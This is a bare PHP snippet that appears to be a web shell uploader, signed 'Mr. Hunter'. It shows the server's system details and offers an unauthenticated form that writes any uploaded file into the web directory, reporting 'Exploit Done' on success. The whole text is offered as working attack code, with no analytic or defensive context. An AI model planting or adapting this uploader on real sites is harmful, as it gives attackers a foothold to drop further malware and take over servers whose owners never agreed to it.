echo "Mr. Hunter";
echo "<br>" . php_uname() . "<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='zb'><input type='submit' name='upload' value='upload'>
</form>";

if(isset($_POST['upload'])) {
    if(isset($_FILES['zb']) && $_FILES['zb']['error'] == 0) {
        $upload_file = basename($_FILES['zb']['name']);
        if(@copy($_FILES['zb']['tmp_name'], $upload_file)) {
            echo "Exploit Done";
        } else {
            echo "Fail.";
        }
    } else {
        echo "Fail.";
    }
}
